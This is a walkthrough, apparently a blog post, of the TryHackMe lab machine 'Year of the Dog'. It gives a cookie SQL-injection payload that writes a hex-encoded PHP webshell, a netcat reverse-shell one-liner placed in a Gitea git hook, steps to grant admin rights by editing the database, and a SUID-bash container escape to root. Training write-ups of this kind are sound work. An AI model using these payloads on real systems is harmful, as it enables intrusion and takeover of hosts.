I"ø<p><br /></p>

<blockquote>
  <p>A log of how I did the TryHackMe room Year of the Dog by Muirland Oracle</p>
</blockquote>

<p><br /></p>

<h1 id="year-of-the-dog">Year of the Dog</h1>
<h2 id="request-header-sqli">Request Header SQLi</h2>
<p>A portscan reveals the only ports: 22, 80.</p>

<p>The web server seems to have practically no content. The only thing I fuzzed that returned an interesting result was the <code class="language-plaintext highlighter-rouge">id</code> cookie parameter. Adding a <code class="language-plaintext highlighter-rouge">'</code> to it causes the website to error out, so it seems like some sort of injection is afoot.</p>

<p>The payload <code class="language-plaintext highlighter-rouge">' union select 1, @@version#</code> confirms that the cookie <code class="language-plaintext highlighter-rouge">id</code> parameter is vulnerable to SQL injection.</p>

<p>Iâ€™m able to get a webshell on the server using <code class="language-plaintext highlighter-rouge">' into outfile '/var/www/html/wshell.php' fields terminated by 0x3c3f70687020706173737468727528245f4745545b2263225d293b203f3e#</code></p>

<p>A breakdown of that payload:</p>

<ul>
  <li><code class="language-plaintext highlighter-rouge">into outfile</code> - MySQL syntax to place the selected object into a file</li>
  <li><code class="language-plaintext highlighter-rouge">fields terminated by</code> - Allows you to choose what data to append to each field in the new file</li>
  <li><code class="language-plaintext highlighter-rouge">3c3f70687020706173737468727528245f4745545b2263225d293b203f3e</code> a hex encoded PHP webshell: <code class="language-plaintext highlighter-rouge">&lt;?php passthru($_GET["c"]); ?&gt;</code>. The <code class="language-plaintext highlighter-rouge">0x</code> tells MySQL that the following data is hex and should be treated as such. This was done to bypass a web filter that flagged the characters <code class="language-plaintext highlighter-rouge">&lt;&gt;</code> as malicious.</li>
</ul>

<p>Using that webshell, Iâ€™m able to execute a reverse shell and get a session on the machine as the user <code class="language-plaintext highlighter-rouge">www-data</code>.</p>

<h2 id="readable-authentication-log">Readable Authentication Log</h2>
<p>To escalate to the user <code class="language-plaintext highlighter-rouge">dylan</code>, I found a file named <code class="language-plaintext highlighter-rouge">work_analysis</code> in that userâ€™s home directory.</p>

<p>The file seemed to be a copy of a locally hosted web applicationâ€™s authentication logs. I grepped for <code class="language-plaintext highlighter-rouge">dylan</code> in that file and found an entry where the user had accidentally typed their password in the username field.</p>

<p>Using this password, Iâ€™m able to get an SSH session as <code class="language-plaintext highlighter-rouge">dylan</code>.</p>

<h2 id="database-overwrite--malicious-git-hook">Database Overwrite &amp; Malicious Git Hook</h2>
<p>A check on the active ports showed a Gitea server being served on <code class="language-plaintext highlighter-rouge">127.0.0.1:3000</code>. I used SSH with the port-forwarding parameter <code class="language-plaintext highlighter-rouge">-L 8090:127.0.0.1:3000</code> to send connections against my local machineâ€™s port <code class="language-plaintext highlighter-rouge">8090</code> to the address <code class="language-plaintext highlighter-rouge">127.0.0.1:3000</code> through the SSH connection.</p>

<p>With this, Iâ€™m able to browse the Gitea website. I create a user <code class="language-plaintext highlighter-rouge">test</code>.</p>

<p>I use <code class="language-plaintext highlighter-rouge">scp</code> as <code class="language-plaintext highlighter-rouge">dylan</code> to download the <code class="language-plaintext highlighter-rouge">Gitea.db</code> database file. Using <code class="language-plaintext highlighter-rouge">sqlite</code> Iâ€™m able to view the database and make edits to it. I find the user table and notice the <code class="language-plaintext highlighter-rouge">is_admin</code> parameter and edit that column to make my user an admin.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sqlite&gt; select email, is_admin from user;
dylan@yearofthedog.thm|1
test@gmail.com|0

sqlite&gt; update user set is_admin = 1 where email = 'test@gmail.com';
</code></pre></div></div>

<p>Refreshing the page now shows that my user <code class="language-plaintext highlighter-rouge">test</code> is an admin.</p>

<p>With admin privileges Iâ€™m now able to use the githooks functionality. I create a repo and append this reverse shell code: <code class="language-plaintext highlighter-rouge">mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc &lt;IP&gt; &lt;PORT&gt; &gt;/tmp/f</code> to one of the template scripts in the repoâ€™s githooks section.</p>

<p>It took some trial and error to arrive at that reverse shell. The version of that shell available on PentestMonkey didnâ€™t function. Fortunately, a verbose stack trace was displayed in the terminal when the script failed, allowing me to refine the one-liner.</p>

<p>![[error.png]]</p>

<p>I also did some online research on different types of bash/sh reverse shells.</p>

<h2 id="abusing-container-privileges">Abusing Container Privileges</h2>
<p>Naturally, the reverse shell from the githook places me in a container.</p>

<p>Iâ€™m easily able to get root access since <code class="language-plaintext highlighter-rouge">sudo</code> is available for all commands; I just <code class="language-plaintext highlighter-rouge">sudo -s</code>.</p>

<p>Reading through the Gitea documentation and the <code class="language-plaintext highlighter-rouge">app.ini</code> file for the web server, the <code class="language-plaintext highlighter-rouge">/data</code> directory within the container maps to a directory on the host machine.</p>

<p>I navigate to <code class="language-plaintext highlighter-rouge">/bin</code> with my session as <code class="language-plaintext highlighter-rouge">dylan</code> and use <code class="language-plaintext highlighter-rouge">python3 -m http.server</code> to host a web server on port <code class="language-plaintext highlighter-rouge">8000</code>.</p>

<p>Within the container, I use <code class="language-plaintext highlighter-rouge">ip a</code> to see that the container is communicating through the virtual IP of <code class="language-plaintext highlighter-rouge">172.17.0.2</code>. The gateway address in this subnet would naturally route to the host machine, so I do <code class="language-plaintext highlighter-rouge">wget 172.17.0.1:8000/bash -O /data/bash</code> to download a copy of the bash binary.</p>

<p>With <code class="language-plaintext highlighter-rouge">chmod +sx /data/bash</code> I make the binary executable by anyone and give it the SUID bit. Since Iâ€™ve downloaded it as <code class="language-plaintext highlighter-rouge">root</code> within the container, the SUID bit will make the binary run as <code class="language-plaintext highlighter-rouge">root</code>.</p>

<p>With my session as <code class="language-plaintext highlighter-rouge">dylan</code> I do <code class="language-plaintext highlighter-rouge">./bash -p</code> to get a shell as <code class="language-plaintext highlighter-rouge">root</code>. Here is an explanation of what <code class="language-plaintext highlighter-rouge">-p</code> is for, taken from the bash man pages:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>If the shell is started with the effective user (group) id not equal to the real user (group) id, and the **-p**option is not supplied, no startup files are read, shell functions are not inherited from the environment, the **SHELLOPTS**, **BASHOPTS**, **CDPATH**, and **GLOBIGNORE** variables, if they appear in the environment, are ignored, and the effective user id is set to the real user id. If the **-p** option is supplied at invocation, the startup behavior is the same, but the effective user id is not reset.
</code></pre></div></div>
:ET